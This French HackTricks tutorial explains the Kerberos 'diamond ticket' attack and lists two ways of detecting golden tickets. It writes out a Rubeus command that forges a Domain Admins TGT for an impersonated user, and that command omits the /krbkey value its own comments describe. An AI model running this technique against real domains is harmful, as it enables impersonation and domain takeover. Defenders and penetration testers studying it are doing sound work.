# Billet Diamond

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Billet Diamond

**Comme un billet d'or**, un billet diamond est un TGT qui peut être utilisé pour **accéder à n'importe quel service en tant que n'importe quel utilisateur**. Un billet d'or est forgé entièrement hors ligne, chiffré avec le hachage krbtgt de ce domaine, puis passé dans une session de connexion pour être utilisé. Parce que les contrôleurs de domaine ne suivent pas les TGT qu'ils ont légitimement émis, ils accepteront volontiers les TGT chiffrés avec leur propre hachage krbtgt.

Il existe deux techniques courantes pour détecter l'utilisation de billets d'or :

* Recherchez les TGS-REQs qui n'ont pas de AS-REQ correspondant.
* Recherchez les TGT qui ont des valeurs ridicules, telles que la durée de vie par défaut de 10 ans de Mimikatz.

Un **billet diamond** est créé en **modifiant les champs d'un TGT légitime qui a été émis par un DC**. Cela est réalisé en **demandant** un **TGT**, en le **déchiffrant** avec le hachage krbtgt du domaine, en **modifiant** les champs souhaités du billet, puis en le **re-chiffrant**. Cela **surmonte les deux lacunes mentionnées précédemment** d'un billet d'or car :

* Les TGS-REQs auront un AS-REQ précédent.
* Le TGT a été émis par un DC, ce qui signifie qu'il aura tous les détails corrects de la politique Kerberos du domaine. Même si ceux-ci peuvent être précisément contrefaits dans un billet d'or, c'est plus complexe et sujet aux erreurs.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
